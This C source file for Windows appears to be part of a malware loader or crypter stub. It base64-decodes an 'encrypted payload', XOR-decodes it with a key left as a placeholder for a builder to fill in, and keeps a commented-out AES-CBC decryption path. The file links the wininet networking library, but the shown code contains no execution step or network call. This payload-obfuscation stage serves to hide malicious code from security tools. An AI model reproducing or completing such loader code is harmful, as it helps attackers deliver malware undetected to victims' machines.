#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <bcrypt.h>
#include <Wincrypt.h>
#include "aes.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

BOOL Base64Decode(PCHAR base64, DWORD base64Size, PBYTE* pDecoded, DWORD* pDecodedSize) {
    if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, NULL, pDecodedSize, NULL, NULL)) {
        printf("First base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
        return FALSE;
    }

    *pDecoded = (PBYTE)malloc(*pDecodedSize);
    if (*pDecoded == NULL) {
        printf("Memory allocation failed.");
        return FALSE;
    }

    if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, *pDecoded, pDecodedSize, NULL, NULL)) {
        printf("Second base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
        free(*pDecoded);
        return FALSE;
    }

    return TRUE;
}

void XOR(PBYTE data, DWORD dataSize, PBYTE key, DWORD keySize) {
    for (DWORD i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize];
    }
}

BOOL DecryptPayload(PBYTE base64EncryptedPayload, DWORD base64EncryptedSize, PBYTE* pDecryptedPayload, DWORD* pDecodedSize) {
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbData = 0;
    DWORD decryptedSize = 0;
    char* xorKeyBase64 = "#1";
    DWORD xorKeyBase64Size = strlen(xorKeyBase64);
    /*char* aesKeyBase64 = "#2";
    DWORD aesKeyBase64Size = strlen(aesKeyBase64);
    char* ivBase64 = "#3";
    DWORD ivBase64Size = strlen(ivBase64);*/

    PBYTE encryptedPayload;
    DWORD encryptedSize;
    Base64Decode(base64EncryptedPayload, base64EncryptedSize, &encryptedPayload, &encryptedSize);

    PBYTE xorKey;
    DWORD xorKeySize;
    Base64Decode(xorKeyBase64, xorKeyBase64Size, &xorKey, &xorKeySize);

    XOR(encryptedPayload, encryptedSize, xorKey, xorKeySize);

    *pDecodedSize = encryptedSize;
    *pDecryptedPayload = encryptedPayload;

    free(xorKey);

    return TRUE;
}


//BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
 //BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
 //BCryptGenerateSymmetricKey(hAesAlg, &hKey, NULL, 0, aesKey, aesKeySize, 0);

 //printf("Decrypting now 1\n");
 //// Initial call to determine the required buffer size.
 //NTSTATUS decryptStatus = BCryptDecrypt(hKey, encryptedPayload, encryptedSize, NULL, iv, ivSize, NULL, 0, &decryptedSize, BCRYPT_BLOCK_PADDING);
 //if (!NT_SUCCESS(decryptStatus)) {
 //    printf("Error in BCryptDecrypt (size determination).\n");
 //    return FALSE;
 //}

 //// Allocate memory for the decrypted payload
 //*pDecryptedPayload = (PBYTE)malloc(decryptedSize);
 //if (*pDecryptedPayload == NULL) {
 //    printf("Memory allocation failed.\n");
 //    return FALSE;
 //}

 //printf("Decrypting now 2\n");
 //// Call again to decrypt the payload
 //decryptStatus = BCryptDecrypt(hKey, encryptedPayload, encryptedSize, NULL, iv, ivSize, *pDecryptedPayload, decryptedSize, &cbData, BCRYPT_BLOCK_PADDING);
 //printf("BCryptDecrypt returned NTSTATUS: 0x%08X\n", decryptStatus);

 //if (!NT_SUCCESS(decryptStatus)) {
 //    printf("Error in BCryptDecrypt (decryption).\n");
 //    free(*pDecryptedPayload);
 //    return FALSE;
 //}

   /*PBYTE aesKey;
    DWORD aesKeySize;
    Base64Decode(aesKeyBase64, aesKeyBase64Size, &aesKey, &aesKeySize);

    PBYTE iv;
    DWORD ivSize;
    Base64Decode(ivBase64, ivBase64Size, &iv, &ivSize);

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, aesKey, iv);
    AES_CBC_decrypt_buffer(&ctx, encryptedPayload, encryptedSize);*/